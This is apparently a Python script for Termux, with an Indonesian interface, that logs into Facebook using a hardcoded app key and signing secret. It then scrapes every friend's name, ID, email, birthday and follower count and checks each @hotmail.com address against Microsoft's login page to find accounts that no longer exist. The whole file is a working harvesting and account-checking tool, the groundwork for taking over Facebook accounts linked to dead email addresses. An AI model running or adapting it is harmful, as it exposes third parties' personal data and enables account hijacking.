# coding=utf-8

#<!----- import module -----!>#
import os
import re
import sys
import time
import hashlib
import random
import requests
from threading import *
from multiprocessing.pool import ThreadPool

class Hotmail:
	def __init__(self):
		self.banner = ("""\033[1;96m                                             
 ____                   _____     _             _ _ 
|    \ _ _ _____ ___   |  |  |___| |_ _____ ___|_| |
|  |  | | |     | . |  |     | . |  _|     | .'| | |
|____/|___|_|_|_|  _|  |__|__|___|_| |_|_|_|__,|_|_|
      \033[0m© {year}    \033[1;96m|_|     \033[0mMade With Love By DulLah \033[0m\n""".format(
                	year = str(time.strftime("%Y"))
                ))
                
		self.login()
	
	def login(self):
		os.system("clear")
		print(
			self.banner
		)
		self.headers = {
			"Content-Type" : "application/json;charset=UTF-8",
			"User-Agent" : "Mozilla/5.0 (Linux; Android 8.0.0;) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",
		}
		
		#<!----- check access token -----!>#
		if (os.path.exists("token.log") != False):
			self.main()
			exit()
		
		#<!----- login to generate access token -----!>#
		print("* izinkan termux untuk mengakses penyimpanan.")
		user = raw_input("> username: ")
		pasw = raw_input("> password: ")
		
		sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={username}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=idmethod=auth.loginpassword={password}return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32".format(
			username=user,
				password=pasw
		)
		params = {
			"api_key" : "882a8490361da98702bf97a021ddc14d",
			"credentials_type" : "password",
			"email" : user,
			"format" : "JSON",
			"generate_machine_id" : "1",
			"generate_session_cookies" : "1",
			"locale" : "id",
			"method" : "auth.login",
			"password" : pasw,
			"return_ssl_resources" : "0",
			"v" : "1.0",
		}
		x = hashlib.new("md5")
		x.update(sig)
		params.update({
			"sig" : x.hexdigest()
		})
		content = requests.request(
			"GET", "https://api.facebook.com/restserver.php",
				params = params,
					headers = self.headers
		).json()
		if ("access_token" in str(content)):
			token = content["access_token"]
			open("token.log","w").write(
				token
			)
			self.main()
		elif ("www.facebook.com" in content["error_msg"]):
			exit("> akun checkpoint!!")
		else:
			exit("> login gagal")
	
	def main(self):
		os.system("clear")
		print(
			self.banner
		)
		#<!----- load access token -----!>#
		self.token = open(
			"token.log","r"
		).read()
		
		try:
			cek = requests.request(
				"GET", "https://graph.facebook.com/me?access_token={token}".format(
					token = self.token,
						headers = self.headers
			)).json()
			try:
				user = cek["username"]
			except:
				user = cek["id"]
				
			print("> LOGIN SEBAGAI : \033[0;92m{nama} ({username})\033[0m\n".format(
				nama = cek["name"], username = user
			))
			
			print("> mengambil id...")
			friends = requests.request(
				"GET", "https://graph.facebook.com/me/friends?access_token={token}".format(
					token = self.token,
						headers = self.headers
			)).json()
			self.agent = requests.request(
				"GET", "https://pastebin.com/raw/zkCXTGcm"
			).text
			
			self.date = str(time.strftime("%Y-%H-%M-%S"))
			self.userid = []
			self.loop = 0
			
			for id in friends["data"]:
				self.userid.append(id["id"])
			
			print("> total id \033[0;92m{total}\033[0m".format(
				total = len(self.userid)
			))
			self.thread = int(raw_input("> thread (int): "))
			process = Thread(target=self.threads)
			process.start()
			self.animation(process)
			process.join()
			
		except KeyError:
			print("> error : access token mati.")
			time.sleep(2)
			os.remove("token.log")
			self.login()
			exit()
	
	def threads(self):
		ThreadPool(
			self.thread
		).map(
			self.mainDump, self.userid
		)
	
	def animation(self, process):
		total = len(self.userid)
		while process.is_alive():
			for load in ["/","—","|"]:
				done = int(25*self.loop / total)
				sys.stdout.write(
					"\r[{}{}] {}/{} {}  ".format(
						"#"*done, "."* (25-done),
							self.loop, total, load
				))
				sys.stdout.flush()
				time.sleep(.1)

		os.remove("token.log")
		exit("\r> done hasil tersimpan di : \033[0;92m/sdcard/"+self.date+".txt          ")
		
	def mainDump(self, user):
		ua = random.choice(self.agent.split("\n"))
		self.loop +=1
		try:
			content = requests.request(
				"GET", "https://graph.facebook.com/{userid}?access_token={token}".format(
					userid = user, token = self.token,
						headers = self.headers
			)).json()
			
			if ("@hotmail.com" in content["email"]):
				login = requests.request(
					"GET", "https://login.live.com/?username="+content["email"],
						headers = {"User-Agent" : str(ua.strip())}
				).text
				cek = re.findall(r'IfExistsResult":(.*?)},', login)[0]
				
				try:
					nama = content["name"]
					ids = content["id"]
					email = content["email"]
					birth = content["birthday"]
				except:
					birth = "---"
				
				if (cek == "1"):
					foll = requests.request(
						"GET", "https://graph.facebook.com/{userid}/subscribers?access_token={token}".format(
							userid = user, token = self.token),
								headers = self.headers
					).json()
					try:
						followers = foll["summary"]["total_count"]
					except:
						followers = "---"
					
					print("\r------------------------------------------")
					print("\r Nama      : {name}                      ".format(
						name=nama
					))
					print("\r Uid       : {userids}                 ".format(
						userids=ids
					))
					print("\r Email     : {emails}                 ".format(
						emails=email
					))
					print("\r Ttl       : {ttl}                        ".format(
						ttl=birth
					))
					print("\r Followers : {followers}                   ".format(
						followers=followers
					))
					print("\r------------------------------------------\n")
					open("/sdcard/"+self.date+".txt","a").write(
						"Nama : "+str(nama)+"\nUid : "+str(ids)+"\nEmail : "+str(email)+"\nTtl : "+str(birth)+"\nTahun : "+str(tahun)+"\nFollowers :"+str(followers)+"\n\n"
					)
					
		except: pass
		
Hotmail()
